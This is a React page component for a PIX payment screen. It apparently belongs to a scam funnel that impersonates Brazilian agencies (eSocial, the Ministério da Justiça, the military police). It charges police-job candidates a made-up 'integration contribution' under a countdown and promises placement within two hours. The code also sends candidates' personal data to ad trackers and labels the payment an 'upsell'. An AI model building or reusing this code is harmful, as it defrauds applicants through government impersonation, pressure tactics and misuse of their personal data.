import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { Shield, Clock, CheckCircle2, Copy, Loader2, AlertCircle } from 'lucide-react';
import orgLogo from '@assets/logo-mj_1779836627251.png';
import { fireGtmFirstUpsell } from '@/lib/gtm';
import { useEstadoPM } from '@/hooks/useEstadoPM';

interface UserInfo {
  firstName: string;
  fullName: string;
  cpf: string;
  email: string;
  telefone: string;
  gender: string;
  cargo: string;
}

const CARGO_MAP: Record<string, string> = {
  'soldado-pm': 'Soldado de 2ª Classe PM',
  'oficial-pm': 'Aspirante-a-Oficial PM',
};

interface PixData {
  id: string;
  qrCode: string;
  pixCode: string;
  amount: number;
  status: string;
  createdAt: string;
}

const FALLBACK_PIX_CODE =
  '00020126580014br.gov.bcb.pix0136dae-integracao@esocial.gov.br5204000053039865802BR5925MIN TRABALHO DAE INTEGRA6008BRASILIA62070503***6304';
const FALLBACK_QR_CODE = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&color=1351B4&bgcolor=FFFFFF&data=${encodeURIComponent(FALLBACK_PIX_CODE)}`;

const getColoredQrCode = (url: string) => {
  if (url.includes('api.qrserver.com')) {
    const sep = url.includes('?') ? '&' : '?';
    return `${url}${sep}color=1351B4&bgcolor=FFFFFF`;
  }
  return url;
};

export default function ESocialPagamentoPage() {
  const estadoPM = useEstadoPM();
  const sigla = estadoPM?.sigla ?? 'PM';
  const [, navigate] = useLocation();

  const [userInfo, setUserInfo] = useState<UserInfo>({
    firstName: '', fullName: '', cpf: '', email: '', telefone: '', gender: 'M', cargo: '',
  });
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [citAmount, setCitAmount] = useState(43.20);
  const [paymentStatus, setPaymentStatus] = useState('PENDING');
  const [apiError, setApiError] = useState(false);
  const [showCopiedAnimation, setShowCopiedAnimation] = useState(false);
  const [isCopying, setIsCopying] = useState(false);
  const [timeRemaining, setTimeRemaining] = useState('');
  const [nre] = useState(`NRE${Date.now().toString().slice(-10)}`);

  const copyTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const statusIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // ── Load candidate data and generate PIX ─────────────────────────────────
  useEffect(() => {
    window.scrollTo(0, 0);

    let parsedUser: any = null;
    let applicationData: any = null;

    try { parsedUser = JSON.parse(localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin') || 'null'); } catch (_) {}
    try { applicationData = JSON.parse(localStorage.getItem('applicationData') || 'null'); } catch (_) {}

    const fullName = parsedUser?.nomeCompleto || '';
    const rawFirst = fullName.split(' ')[0] || '';
    const firstName = rawFirst ? rawFirst.charAt(0).toUpperCase() + rawFirst.slice(1).toLowerCase() : '';
    const cpf      = parsedUser?.cpf || '';
    const email    = parsedUser?.email || 'candidato@gmail.com';
    const telefone = parsedUser?.telefone || '';
    const gender   = parsedUser?.sexo || parsedUser?.genero || parsedUser?.gender || 'M';

    const positionId = applicationData?.positionId || applicationData?.position_id || '';
    const cargo = CARGO_MAP[positionId] || applicationData?.positionTitle || parsedUser?.cargo || 'Soldado de 2ª Classe PM';

    setUserInfo({ firstName, fullName, cpf, email, telefone, gender, cargo });

    // Resolve DAE amount + check PIX cache (30 min TTL)
    const resolveValor = async () => {
      // --- try to restore cached PIX first ---
      try {
        const cached = localStorage.getItem('esocialPixData');
        if (cached) {
          const { data, createdAt } = JSON.parse(cached);
          const age = Date.now() - new Date(createdAt).getTime();
          if (age < 30 * 60 * 1000 && data?.id) {
            // Use daeValor (always in reais) for display; data.amount may be in centavos
            const savedDae = localStorage.getItem('daeValor');
            const displayAmount = savedDae ? parseFloat(savedDae) : 43.20;
            const restored: PixData = {
              id: String(data.id),
              qrCode: data.qrCode || FALLBACK_QR_CODE,
              pixCode: data.pixCode || FALLBACK_PIX_CODE,
              amount: displayAmount,
              status: data.status || 'PENDING',
              createdAt: data.createdAt || createdAt,
            };
            setCitAmount(displayAmount);
            setPixData(restored);
            setIsLoading(false);
            return;
          }
        }
      } catch (_) {}

      // --- no valid cache: resolve amount then generate ---
      const saved = localStorage.getItem('daeValor');
      if (saved) {
        const n = parseFloat(saved);
        if (!isNaN(n)) { setCitAmount(n); generatePix(fullName, cpf, n, email, telefone); return; }
      }
      try {
        const gParam = gender.toLowerCase().startsWith('f') ? 'f' : 'm';
        const res = await fetch(`/api/valor-dinamico?tipo=esocial&genero=${gParam}`);
        const json = await res.json();
        if (json.success && json.valor) {
          setCitAmount(json.valor);
          localStorage.setItem('daeValor', String(json.valor));
          generatePix(fullName, cpf, json.valor, email, telefone);
          return;
        }
      } catch (_) {}
      generatePix(fullName, cpf, 43.20, email, telefone);
    };

    resolveValor();

    return () => {
      if (copyTimeoutRef.current) clearTimeout(copyTimeoutRef.current);
      if (statusIntervalRef.current) clearInterval(statusIntervalRef.current);
    };
  }, []);

  const generatePix = async (
    fullName: string, cpf: string, amount: number, email: string, telefone: string,
  ) => {
    setIsLoading(true);
    try {
      const utmParams = (() => {
        try { return JSON.parse(localStorage.getItem('utm_params') || '{}'); } catch { return {}; }
      })();
      const userData = (() => {
        try { return JSON.parse(localStorage.getItem('userData') || '{}'); } catch { return {}; }
      })();

      const response = await fetch('/api/gerar-pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          utm_params: JSON.stringify({
            ...utmParams,
            rt_gender: userData.sexo || '',
            rt_birthday: userData.dataAniversario || '',
            rt_phone: userData.telefone || '',
            rt_zipcode: userData.cep || '',
          }),
          redtrack_clickid: localStorage.getItem('redtrack_clickid') || '',
          customer: {
            name: fullName || 'Candidato',
            email: email || 'candidato@gmail.com',
            phone: telefone || '',
            cpf: cpf || '',
          },
          description: `${import.meta.env.VITE_PRODUCT_NAME || 'PM'}3`,
          amount,
        }),
      });

      const result = await response.json();

      if (result.success && result.data) {
        const d = result.data;
        const pix: PixData = {
          id: String(d.id),
          qrCode: d.qrCode,
          pixCode: d.pixCode,
          amount: d.amount,
          status: d.status,
          createdAt: d.createdAt,
        };
        setPixData(pix);
        localStorage.setItem('esocialPixData', JSON.stringify({ data: d, createdAt: new Date().toISOString() }));
      } else {
        throw new Error(result.error || 'API error');
      }
    } catch (_) {
      setApiError(true);
      setPixData({
        id: `fallback-${Date.now()}`,
        qrCode: FALLBACK_QR_CODE,
        pixCode: FALLBACK_PIX_CODE,
        amount,
        status: 'PENDING',
        createdAt: new Date().toISOString(),
      });
    } finally {
      setIsLoading(false);
    }
  };

  // ── Countdown timer ───────────────────────────────────────────────────────
  useEffect(() => {
    if (!pixData?.createdAt) return;
    const update = () => {
      const left = new Date(pixData.createdAt).getTime() + 30 * 60 * 1000 - Date.now();
      if (left <= 0) { setTimeRemaining('Expirado'); return; }
      const m = Math.floor((left % (60 * 60 * 1000)) / 60000);
      const s = Math.floor((left % 60000) / 1000);
      setTimeRemaining(`${m}:${s.toString().padStart(2, '0')}`);
    };
    update();
    const t = setInterval(update, 1000);
    return () => clearInterval(t);
  }, [pixData?.createdAt]);

  // ── Payment status polling ────────────────────────────────────────────────
  const checkStatus = async () => {
    if (!pixData?.id || pixData.id.startsWith('fallback-')) return;
    try {
      const res = await fetch(`/api/verificar-status-pagamento/${pixData.id}`);
      const json = await res.json();
      if (json.success) {
        const status = json.data?.status ?? json.status;
        setPaymentStatus(status);
        if (['paid', 'completed', 'approved'].includes((status || '').toLowerCase())) {
          if (statusIntervalRef.current) { clearInterval(statusIntervalRef.current); statusIntervalRef.current = null; }
          fireGtmFirstUpsell({ transactionId: pixData.id, value: pixData.amount, frontTransactionId: pixData.id });
          localStorage.setItem('esocialPaymentConfirmed', JSON.stringify({
            transactionId: pixData.id,
            status,
            confirmedAt: new Date().toISOString(),
          }));
          navigate('/e-social/confirmado');
        }
      }
    } catch (_) {}
  };

  useEffect(() => {
    if (!pixData?.id || pixData.id.startsWith('fallback-')) return;
    checkStatus();
    statusIntervalRef.current = setInterval(checkStatus, 10000);
    return () => { if (statusIntervalRef.current) clearInterval(statusIntervalRef.current); };
  }, [pixData?.id]);

  // ── Copy PIX code ─────────────────────────────────────────────────────────
  const showCopySuccess = () => {
    setShowCopiedAnimation(true);
    setIsCopying(false);
    copyTimeoutRef.current = setTimeout(() => {
      setShowCopiedAnimation(false);
      copyTimeoutRef.current = null;
    }, 3000);
  };

  const fallbackCopy = (text: string) => {
    const el = document.createElement('textarea');
    el.value = text;
    el.style.cssText = 'position:fixed;left:-999999px;top:-999999px';
    document.body.appendChild(el);
    el.focus(); el.select();
    try { document.execCommand('copy'); showCopySuccess(); } catch (_) { setIsCopying(false); }
    finally { document.body.removeChild(el); }
  };

  const handleCopy = () => {
    if (!pixData?.pixCode || isCopying || showCopiedAnimation) return;
    setIsCopying(true);
    if (copyTimeoutRef.current) { clearTimeout(copyTimeoutRef.current); copyTimeoutRef.current = null; }
    if (navigator.clipboard?.writeText) {
      navigator.clipboard.writeText(pixData.pixCode).then(showCopySuccess).catch(() => fallbackCopy(pixData!.pixCode));
    } else {
      fallbackCopy(pixData.pixCode);
    }
  };

  // ── Loading screen ────────────────────────────────────────────────────────
  if (isLoading) {
    return (
      <div className="min-h-screen bg-white flex flex-col" style={{ fontFamily: "'Rawline','Open Sans',sans-serif" }}>
        <ExercitoHeader customTitle="Guia de Regularização DAE" customSubtitle="Atendimento de Integração Trabalhista" block_name={false} />
        <div className="flex-1 flex items-center justify-center">
          <div className="text-center space-y-4">
            <Loader2 className="w-12 h-12 text-[#0063AF] animate-spin mx-auto" />
            <p className="text-gray-600 text-sm">Gerando código de pagamento...</p>
          </div>
        </div>
      </div>
    );
  }

  const now = new Date();
  const pixCreatedAt = pixData?.createdAt ? new Date(pixData.createdAt) : now;
  const vencimento = new Date(pixCreatedAt.getTime() + 30 * 60 * 1000);
  const fmt = (d: Date) => d.toLocaleString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' });

  return (
    <div className="min-h-screen flex flex-col" style={{ fontFamily: "'Rawline','Open Sans',sans-serif" }}>
      <ExercitoHeader customTitle="Guia de Regularização DAE" customSubtitle="Atendimento de Integração Trabalhista" block_name={false} />

      <div className="bg-green-50 border-b border-green-200 py-2 px-4">
        <div className="max-w-xl mx-auto flex items-center justify-center gap-2">
          <Shield className="w-3.5 h-3.5 text-green-600 flex-shrink-0" />
          <span className="text-green-800 text-xs font-semibold tracking-wide">Pagamento 100% seguro</span>
          <span className="text-green-600 text-[10px]">•</span>
          <span className="text-green-700 text-[10px]">Ambiente criptografado</span>
        </div>
      </div>

      <div className="flex-1 py-6">
        <div className="max-w-md mx-auto px-4">

          {/* DAE header */}
          <div className="border-b border-gray-300 pb-4 mb-4">
            <p className="text-[10px] text-gray-500 uppercase tracking-widest">Guia de Regularização</p>
            <p className="text-sm text-gray-700 mt-1">DAE — Documento de Arrecadação do eSocial</p>
          </div>

          {/* Candidate info */}
          <div className="space-y-3 text-xs mb-6">
            <div className="flex justify-between">
              <span className="text-gray-500">Contribuinte</span>
              <span className="text-gray-700 truncate max-w-[200px]">{userInfo.fullName || 'Candidato'}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">CPF</span>
              <span className="text-gray-700">{userInfo.cpf || '---'}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Cargo</span>
              <span className="text-gray-700 truncate max-w-[200px]">{userInfo.cargo || 'Soldado de 2ª Classe PM'}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Competência</span>
              <span className="text-gray-700">{now.toLocaleDateString('pt-BR', { month: '2-digit', year: 'numeric' })}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Vencimento</span>
              <span className="text-gray-700">{fmt(vencimento)}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Referência</span>
              <span className="text-gray-600 font-mono text-[11px]">{nre}</span>
            </div>
          </div>

          {/* Amount */}
          <div className="border-t border-gray-300 pt-4 mb-6">
            <div className="flex justify-between text-xs mb-2">
              <span className="text-gray-500">CIT — Contribuição de Integração</span>
              <span className="text-gray-700">R$ {citAmount.toFixed(2).replace('.', ',')}</span>
            </div>
            <div className="flex justify-between pt-3 border-t border-dashed border-gray-300">
              <span className="text-sm text-gray-700">Total</span>
              <span className="text-base font-semibold text-gray-800">R$ {citAmount.toFixed(2).replace('.', ',')}</span>
            </div>
          </div>

          {/* Timer */}
          {timeRemaining && timeRemaining !== 'Expirado' && (
            <div className="flex items-center gap-2 mb-4 text-xs text-amber-700 bg-amber-50 border border-amber-200 rounded-lg px-3 py-2">
              <Clock className="w-3.5 h-3.5 flex-shrink-0" />
              <span>Guia expira em <strong>{timeRemaining}</strong></span>
            </div>
          )}

          {/* QR Code + copy button */}
          {pixData && (
            <div className="border-t border-gray-300 pt-6">
              <div className="flex flex-col items-center">
                <div className="mb-4">
                  <img
                    src={getColoredQrCode(pixData.qrCode || FALLBACK_QR_CODE)}
                    alt="Código QR do Pix"
                    className="w-36 h-36"
                  />
                </div>

                <div className="w-full">
                  <div className="p-3 mb-3">
                    <p className="text-[10px] font-mono text-gray-600 break-all leading-relaxed">
                      {(pixData.pixCode || FALLBACK_PIX_CODE).substring(0, 70)}...
                    </p>
                  </div>

                  <button
                    onClick={handleCopy}
                    disabled={isCopying || showCopiedAnimation}
                    className={`w-full py-3.5 text-sm font-medium flex items-center justify-center gap-2 transition-all duration-300 rounded-lg ${
                      showCopiedAnimation
                        ? 'bg-green-500 text-white scale-[1.02] shadow-lg shadow-green-500/25'
                        : 'bg-[#0063AF] hover:bg-[#004D8C] text-white hover:scale-[1.01] active:scale-[0.99]'
                    }`}
                  >
                    {showCopiedAnimation ? (
                      <>
                        <CheckCircle2 className="w-5 h-5 animate-bounce" />
                        <span className="animate-pulse">Código copiado!</span>
                      </>
                    ) : isCopying ? (
                      <Loader2 className="w-5 h-5 animate-spin" />
                    ) : (
                      <>
                        <Copy className="w-4 h-4" />
                        Copiar código Pix
                      </>
                    )}
                  </button>

                  {apiError && (
                    <div className="mt-3 flex items-start gap-2 text-xs text-amber-700 bg-amber-50 border border-amber-200 rounded-lg px-3 py-2">
                      <AlertCircle className="w-3.5 h-3.5 flex-shrink-0 mt-0.5" />
                      <span>Use o código acima para realizar o pagamento via Pix em qualquer banco.</span>
                    </div>
                  )}
                </div>
              </div>

              {/* Payment status badge */}
              <div className="mt-6 flex items-center justify-center gap-2 text-xs">
                {['paid', 'completed', 'approved'].includes((paymentStatus || '').toLowerCase()) ? (
                  <span className="flex items-center gap-1.5 text-green-700 bg-green-50 border border-green-200 px-3 py-1.5 rounded-full">
                    <CheckCircle2 className="w-3.5 h-3.5" /> Pagamento confirmado
                  </span>
                ) : (
                  <span className="flex items-center gap-1.5 text-gray-500 bg-gray-50 border border-gray-200 px-3 py-1.5 rounded-full">
                    <Loader2 className="w-3.5 h-3.5 animate-spin" /> Aguardando pagamento
                  </span>
                )}
              </div>
            </div>
          )}

          {/* Info block */}
          <div className="mt-8 bg-[#EFF6FC] rounded-lg p-4 text-xs text-[#0063AF] space-y-1.5">
            <div className="flex items-center gap-2 font-medium mb-1">
              <Shield className="w-3.5 h-3.5" /> Pagamento seguro — {sigla}
            </div>
            <p className="text-gray-600">Após o pagamento, sua integração ao quadro da {sigla} será processada automaticamente em até 2 horas.</p>
          </div>

          {/* Footer logo */}
          <div className="mt-8 pt-4 border-t border-gray-300 flex justify-center">
            <img src={orgLogo} alt="Ministério da Justiça e Segurança Pública" className="h-9 object-contain opacity-80" />
          </div>
          <p className="text-center text-[#AAAAAA] text-[10px] mt-3">
            Portal do Candidato v3.6 · eSocial Federal
          </p>
        </div>
      </div>
    </div>
  );
}
